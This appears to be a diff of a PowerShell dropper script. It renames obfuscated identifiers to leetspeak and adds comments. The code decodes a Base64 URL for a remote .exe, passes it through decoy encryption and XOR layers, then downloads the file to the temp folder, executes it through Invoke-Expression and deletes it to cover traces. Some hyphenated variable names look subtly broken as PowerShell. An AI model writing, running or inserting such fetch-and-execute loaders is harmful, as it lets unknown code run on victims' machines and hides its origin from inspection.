@@ -1,128 +1,144 @@
+# Base64 encoded URL
 $asdfewvvbqrrqwe = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"
 
-function 655465566555 {
+# Function to decode Base64 string
+function D3c0d3-B4s364-57r1ng {
     param (
-        [string]$54643554yt5y
+        [string]$b4s364-57r1ng
     )
     try {
-        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($54643554yt5y))
+        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b4s364-57r1ng))
     } catch {
-        Write-Error "Failed : $_"
+        Write-Error "Failed to decode Base64 string: $_"
         return $null
     }
 }
 
-$56fgdsargyh54-4t345tq34tgf = 655465566555 -54643554yt5y $asdfewvvbqrrqwe
+# Decode the URL
+$d3c0d3d-uRl = D3c0d3-B4s364-57r1ng -b4s364-57r1ng $asdfewvvbqrrqwe
 
-function 43ftg2354tv25 {
+# Function to download a file
+function D0wnl0ad-F1l3 {
     param (
-        [string]$4t345tq34tgf
+        [string]$uRl
     )
     try {
-        $34ft2354f2g45gy = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($4t345tq34tgf))
-        $t354gt254ygh66 = New-Object System.Net.WebClient
-        $t354gt254ygh66.DownloadFile($4t345tq34tgf, $34ft2354f2g45gy)
-        return $34ft2354f2g45gy
+        $oUtpU7-P4th = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($uRl))
+        $w3bCl13nt = New-Object System.Net.WebClient
+        $w3bCl13nt.DownloadFile($uRl, $oUtpU7-P4th)
+        return $oUtpU7-P4th
     } catch {
-        Write-Error "Failed: $_"
+        Write-Error "Failed to download file from $uRl: $_"
         return $null
     }
 }
 
-function t3245t3452t5 {
+# Function to execute a file
+function Ex3cU73-F1l3 {
     param (
-        [string]$g54t234ghy45y5h
+        [string]$f1l3-P4th
     )
     try {
-        Start-Process -FilePath $g54t234ghy45y5h -NoNewWindow -Wait
+        Start-Process -FilePath $f1l3-P4th -NoNewWindow -Wait
     } catch {
-        Write-Error "Failed: $_"
+        Write-Error "Failed to execute file at $f1l3-P4th: $_"
     }
 }
 
-function 4ft324gft567y6 {
+# Function to shift characters in a string (encrypt)
+function E6crypt-57r1ng {
     param (
-        [string]$5yt345g345
+        [string]$1nput
     )
     try {
-        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
-        $4f3tf234t2547677 = ""
+        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
+        $3nc0d3d-57r1ng = ""
         foreach ($ch4r in $ch4rs) {
-            $4f3tf234t2547677 += [char]($ch4r + 1)
+            $3nc0d3d-57r1ng += [char]($ch4r + 1)
         }
-        return $4f3tf234t2547677
+        return $3nc0d3d-57r1ng
     } catch {
-        Write-Error "Failed: $_"
+        Write-Error "Failed to encrypt string: $_"
         return $null
     }
 }
 
-function 45t345ty245gy455565656 {
+# Function to shift characters in a string (decrypt)
+function D3crypt-57r1ng {
     param (
-        [string]$5yt345g345
+        [string]$1nput
     )
     try {
-        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
-        $ty45gy345y366h767 = ""
+        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
+        $d3c0d3d-57r1ng = ""
         foreach ($ch4r in $ch4rs) {
-            $ty45gy345y366h767 += [char]($ch4r - 1)
+            $d3c0d3d-57r1ng += [char]($ch4r - 1)
         }
-        return $ty45gy345y366h767
+        return $d3c0d3d-57r1ng
     } catch {
-        Write-Error "Failed: $_"
+        Write-Error "Failed to decrypt string: $_"
         return $null
     }
 }
 
-function 4ft235ty6667 {
+# Function to XOR encode a string
+function X0r-3nC0d3 {
     param (
-        [string]$5yt345g345,
-        [int]$4tf345tg56566
+        [string]$1nput,
+        [int]$k3y
     )
     try {
-        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
-        $4f3tf234t2547677 = ""
+        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
+        $3nc0d3d-57r1ng = ""
         for ($i = 0; $i -lt $ch4rs.Length; $i++) {
-            $4f3tf234t2547677 += [char]($ch4rs[$i] -bxor $4tf345tg56566)
+            $3nc0d3d-57r1ng += [char]($ch4rs[$i] -bxor $k3y)
         }
-        return $4f3tf234t2547677
+        return $3nc0d3d-57r1ng
     } catch {
-        Write-Error "Failed: $_"
+        Write-Error "Failed to XOR encode string: $_"
         return $null
     }
 }
 
-function 45t2435gy56566 {
+# Function to XOR decode a string
+function X0r-D3c0d3 {
     param (
-        [string]$5yt345g345,
-        [int]$4tf345tg56566
+        [string]$1nput,
+        [int]$k3y
     )
     try {
-        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
-        $ty45gy345y366h767 = ""
+        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($1nput)
+        $d3c0d3d-57r1ng = ""
         for ($i = 0; $i -lt $ch4rs.Length; $i++) {
-            $ty45gy345y366h767 += [char]($ch4rs[$i] -bxor $4tf345tg56566)
+            $d3c0d3d-57r1ng += [char]($ch4rs[$i] -bxor $k3y)
         }
-        return $ty45gy345y366h767
+        return $d3c0d3d-57r1ng
     } catch {
-        Write-Error "Failed: $_"
+        Write-Error "Failed to XOR decode string: $_"
         return $null
     }
 }
 
-$3nc0d3d-4t345tq34tgf = 4ft324gft567y6 -5yt345g345 $56fgdsargyh54-4t345tq34tgf
+# Encrypt the URL
+$3nc0d3d-uRl = E6crypt-57r1ng -1nput $d3c0d3d-uRl
 
-$t5g4t54g435h6hy-4t345tq34tgf = 4ft235ty6667 -5yt345g345 $3nc0d3d-4t345tq34tgf -4tf345tg56566 5
+# XOR encode the encrypted URL
+$x0r3nc0d3d-uRl = X0r-3nC0d3 -1nput $3nc0d3d-uRl -k3y 5
 
-$y756hu7j7j788787-4t345tq34tgf = 45t2435gy56566 -5yt345g345 $t5g4t54g435h6hy-4t345tq34tgf -4tf345tg56566 5
+# XOR decode the encrypted URL
+$x0r3d3c0d3d-uRl = X0r-D3c0d3 -1nput $x0r3nc0d3d-uRl -k3y 5
 
-$56fgdsargyh54-4t345tq34tgf = 45t345ty245gy455565656 -5yt345g345 $y756hu7j7j788787-4t345tq34tgf
+# Decrypt the URL
+$d3c0d3d-uRl = D3crypt-57r1ng -1nput $x0r3d3c0d3d-uRl
 
-$g54t234ghy45y5h = 43ftg2354tv25 -4t345tq34tgf $56fgdsargyh54-4t345tq34tgf
+# Download the file
+$f1l3-P4th = D0wnl0ad-F1l3 -uRl $d3c0d3d-uRl
 
-if ($g54t234ghy45y5h) {
+# Check if the file was downloaded successfully
+if ($f1l3-P4th) {
+    # Execute the file using Invoke-Expression
+    Invoke-Expression "Ex3cU73-F1l3 -f1l3-P4th `"$f1l3-P4th`""
 
-    Invoke-Expression "t3245t3452t5 43t23gf255g656h `"$g54t234ghy45y5h`""
-
-    Remove-Item -Path $g54t234ghy45y5h
+    # Remove the file after execution
+    Remove-Item -Path $f1l3-P4th
 }
